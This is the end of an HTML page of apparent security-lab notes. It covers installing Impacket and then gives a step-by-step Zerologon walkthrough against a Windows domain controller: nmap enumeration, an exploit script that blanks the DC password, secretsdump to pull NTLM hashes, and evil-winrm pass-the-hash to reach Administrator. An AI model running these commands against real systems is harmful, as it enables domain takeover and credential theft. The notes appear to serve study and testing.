cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 -m pip install virtualenv</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 -m virtualenv impacketEnv</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">source impacketEnv/bin/activate</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pip install git+https://github.com/SecureAuthCorp/impacket</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 161px;"></div><div class="CodeMirror-gutters" style="display: none; height: 161px;"></div></div></div></pre><h4 id='walkthrough'><span>Walkthrough</span></h4><p><span>Get NetBios Name of DC, Domain Name of the network, and fqdn with </span><code>nmap -sC &lt;IP&gt;</code></p><p><span>Run </span><a href='https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py'><strong><span>zeroLogon.py</span></strong></a><span> against your target </span><code>python3 zerologon.py &lt;NetBios name&gt; &lt;IP&gt;</code></p><p><span>		</span><span>Exploited and changed password to blank value</span></p><p><span>Run secretsdump </span><code>secretsdump.py -just-dc -no-pass &lt;domain name&gt;\$@&lt;IP&gt;</code></p><p><span>		</span><span>pulls NTLM hashes from domain controller</span></p><p><span>		</span><span>typically would try to crack hashes</span></p><p><span>Run evil-winrm </span><code>evil-winrm -u &lt;username/Administrator&gt; -H &lt;hash&gt; -i &lt;IP&gt;</code></p><p><span>	</span><code>whoami</code><span> </span></p><p><span>		</span><span>Administrator</span></p><hr /><p>&nbsp;</p><h3 id='openvas'><span>OpenVas</span></h3><p><a href='threatandvuln.html'><span>Top</span></a></p><p>&nbsp;</p></div></div>
</body>
</html>